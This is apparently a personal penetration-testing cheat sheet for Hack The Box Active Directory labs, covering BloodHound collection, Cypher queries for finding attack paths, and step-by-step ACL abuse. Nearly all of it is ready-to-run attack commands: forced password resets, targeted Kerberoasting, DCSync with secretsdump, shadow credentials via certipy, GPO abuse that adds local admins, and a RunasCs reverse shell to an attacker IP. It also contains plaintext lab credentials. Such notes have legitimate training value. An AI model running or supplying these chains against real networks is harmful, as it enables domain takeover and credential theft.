## Collect Data
#### From target:
```
.\SharpHound.exe
```
- better for CE
```
. .\SharpHound.ps1
```
- only use if exe's are blocked
```
Invoke-BloodHound -CollectionMethod All
```
If nothing created and no error, may need to specify output:
```
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp
```
- make sure to create `C:\Temp` if not exist (can use `mkdir` in powershell)
	- usually will give error if `C:\Temp` does not exist
Can also use `-Verbose` to t/s:
```
Invoke-BloodHound -CollectionMethod All -Verbose
```

#### run remotely if LDAP port is open:
```
bloodhound-ce-python -c All -dc FOREST.htb.local -gc FOREST.htb.local -ns 10.129.175.196 -d htb.local -u svc-alfresco -p 's3rvice'
```
or
```
bloodhound-ce-python -c ALL -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174
```
or use nxc:
```
nxc ldap administrator.htb -u Olivia -p ichliebedich --bloodhound --collection All --dns-tcp --dns-server 10.10.11.42
```

---
#### CE
```
sudo docker-compose -f ~/Downloads/docker-compose.yml up -d
```
![[Pasted image 20250411153636.png]]
- go to http://localhost:8080/ui/login
- admin:(more complex version of kali pw)
To end the docker container:
```
sudo docker-compose -f ~/Downloads/docker-compose.yml down
```
- free up port 8080 for foxyproxy
To upload Files, go to Administration > File Ingest
- If zip fails to upload, try json files one at a time to isolate the issue
- delete all data from previous session in Database Management beforehand (or after your done)
![[Pasted image 20250419154307.png]]


---
#### Legacy
 - start neo4j
- `sudo neo4j console`
- neo4j:(kali pw)
- `bloodhound`
- run command from another terminal tab
- clear database
- upload Data


---
#### Queries
```
MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u
```
- Find ASREPRoastable users
```
MATCH (m:Computer) RETURN m
```
- see computers
```
MATCH (m:User) RETURN m
```
- see users
- marked any users with creds as "owned"
	- check owned users for OUTBOUND OBJECT CONTROL > First Degree Object Control
		- Looking for GenericAll, GenericWrite, ForceChangePassword
ex: olivia has GenericAll over Michael & Michael has ForceChangePassword over Benjamin = probably worth checking out)

```
MATCH (n:User {admincount:False}) MATCH (m) WHERE NOT m.name = n.name MATCH p=allShortestPaths((n)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(m)) RETURN p
```
- show privs all non-admin users have against all other nodes

```
MATCH (n:User {admincount:False}) MATCH (m:User) WHERE NOT m.name = n.name MATCH p=allShortestPaths((n)-[r:AllExtendedRights|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner*1..]->(m)) RETURN p
```
- show ACL abuse non-admin users has against other users

```
MATCH (n:User {admincount:False}) MATCH p=allShortestPaths((n)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|AdminTo|CanRDP|ExecuteDCOM|ForceChangePassword*1..]->(m:Computer)) RETURN p
```
- show ACL abuse non-admin users have against computers

```
MATCH (n:User {admincount:False}) MATCH p=allShortestPaths((n)-[r:AddMember*1..]->(m:Group)) RETURN p
```
- show non-admin users that have rights to add members into groups

```
MATCH (u:User) WHERE ANY (x IN u.serviceprincipalnames WHERE toUpper(x) CONTAINS 'SQL')RETURN u
```
- find SPNs with specific keywords (swap `SQL` for anything)

---
#### If user (Olivia) has GenericAll permissions over another user (Michael)
```
net user Michael Password123
```
- Change benjamin's password if currently owned user has GenericAll over benjamin
	- then login as that user and spray all open services with new creds
- can also use bloodyAD command below (if no shell)

---
#### If user (Michael) has ForceChangePassword over another user (Benjamin)
```
bloodyAD -u "Michael" -p "Password123" -d "Administrator.htb" --host "10.10.11.42" set password "Benjamin" "12345678"
```
- using succesfully authenticated creds of michael to reset Benjamin's password

OR with RPC
```
rpcclient -U 'rsmith' //10.10.146.118
```
- put in password, then:
```
setuserinfo2 ewalters 23 "d4nk!!!"
```

---
#### If user (Emily) has GenericWrite permissions over another user (Ethan)
- make sure IP is in `/etc/hosts` with all subdomains
```
sudo ntpdate administrator.htb
```
- syncs timezone for kerberos
- may need to run multiple times if below command fails:
```
targetedKerberoast -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "Administrator.htb" --dc-ip 10.10.11.42
```
- running this command with Emily will display the hash for Ethan
	- run john to crack the hash, then use pw below for secretsdump command

---
#### If user (Ethan) has DCsync over domain (dc.administrator.htb)
```
secretsdump.py "Administrator.htb/ethan:limpbizkit"@"dc.Administrator.htb"
```

---
#### If user (ryan) has writeOwner permissions over another user (ca_svc), run these commands in fast sequence:
```
bloodyAD --host '10.10.11.51' -d 'escapetwo.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan'
```
```
dacledit.py  -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"
```
```
sudo ntpdate sequel.htb
```
```
certipy shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'
```
- sets ryan as owner of ca_svc
- once owner, 2nd command gives ryan full control of ca_svc
- syncs time
- should return hash for ca_svc

---
#### If User has GenericWrite over specific GPO Policy:
![[Pasted image 20250404152856.png]]
- Graphed path from Owned user to Administrator shows GenericWrite over GPO policy, implies privesc
```powershell
./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount enterprise-security --GPOName "SECURITY-POL-VN"
```
![[Pasted image 20250404153731.png]]
```
gpupdate /force
```
![[Pasted image 20250404153941.png]]
- once updates, adds our user to administrator group
```
psexec.py enterprise-security:sand_0873959498@10.10.30.183
```
![[Pasted image 20250404154050.png]]


#### If User is in Group Policy Creator Owners group:
![[Pasted image 20250423155826.png]]
- acquired creds to m.schoolbus who is in Group Policy Creator Owners group
![[Pasted image 20250423155910.png]]
```powershell
New-GPO -Name GPO-New | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB"-LinkEnabled Yes
```
```powershell
get-GPO -All
```
- confirmed GPO was created
![[Pasted image 20250423155951.png]]
```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName GPO-new --force
```
```powershell
gpupdate /force
```
![[Pasted image 20250423160102.png]]
- catch shell with `RunasCs.exe`
```powershell
.\RunasCs.exe 'M.schoolbus' '!suBcig@MehTed!R' powershell.exe -r 10.10.14.207:5555
```